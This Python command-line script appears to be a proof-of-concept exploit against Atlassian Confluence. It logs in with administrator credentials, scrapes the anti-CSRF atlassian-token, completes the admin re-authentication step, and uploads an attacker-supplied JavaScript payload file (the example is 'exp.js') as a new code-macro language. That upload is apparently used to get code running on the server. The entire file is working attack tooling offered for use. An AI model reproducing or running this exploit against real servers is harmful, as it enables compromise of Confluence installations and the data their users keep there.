import re

import click
import requests

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"


def get_atlassian_token(target: str, session: requests.Session) -> str:
    response = session.get(
        url=target,
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
    )
    matches = re.search(
        'id="atlassian-token"\s+name="atlassian-token"\s+content="([a-z0-9]+)"',
        response.text,
        flags=re.IGNORECASE,
    )

    return matches.group(1)


def login(session: requests.Session, url: str, username: str, password: str) -> None:
    data = f"os_username={username}&os_password={password}&login=Log+in&os_destination=%2Findex.action"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    response = session.post(url=url, headers=headers, data=data, verify=False)

    if "the following error(s) occurred" in response.text.lower():
        raise ValueError("Incorrect user or password")

    if response.status_code != 200:
        raise ValueError("Unknown error")


def do_authenticate(
    session: requests.Session, url: str, username: str, password: str, token: str
) -> None:
    data = f"atl_token={token}&password={password}&authenticate=Confirm&destination=%2Fadmin%2Fconsole.action"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    response = session.post(url=url, headers=headers, data=data, verify=False)

    if "the following error(s) occurred" in response.text.lower():
        raise ValueError("Incorrect user or password")

    if response.status_code != 200:
        raise ValueError("Unknown error")


def upload_macros(
    session: requests.Session, url: str, macro_name: str, payload: str, token: str
) -> None:
    data = {"atl_token": token, "newLanguageName": "MyNewLanguage"}

    files = {"languageFile": (macro_name, payload, "text/javascript")}

    response = session.post(url, data=data, files=files, verify=False)

    if response.status_code != 200:
        raise ValueError("Unknown error")


@click.command()
@click.option(
    "--user",
    "-u",
    help="Username of user with system administration privelege. Example: admin",
)
@click.option(
    "--password",
    "-p",
    help="Password of user with system administration privelege. Example: admin",
)
@click.option("--target", "-t", help="URL confluence. Example: http://127.0.0.1:8090")
@click.option("--file", "-f", help="File payload. Example: exp.js")
@click.option("--name", "-n", default="test", help="New language name. Example: test")
def main(user: str, password: str, target: str, file: str, name: str):
    sess = requests.Session()
    sess.headers.update({"User-Agent": USER_AGENT})

    login(
        session=sess, url=f"{target}/dologin.action", username=user, password=password
    )
    token = get_atlassian_token(target=target, session=sess)
    do_authenticate(
        session=sess,
        url=f"{target}/doauthenticate.action",
        username=user,
        password=password,
        token=token,
    )

    with open(file, "rt") as fd:
        payload = fd.read()

    upload_macros(
        session=sess,
        url=f"{target}/admin/plugins/newcode/addlanguage.action",
        macro_name=name,
        payload=payload,
        token=token,
    )


if __name__ == "__main__":
    main()
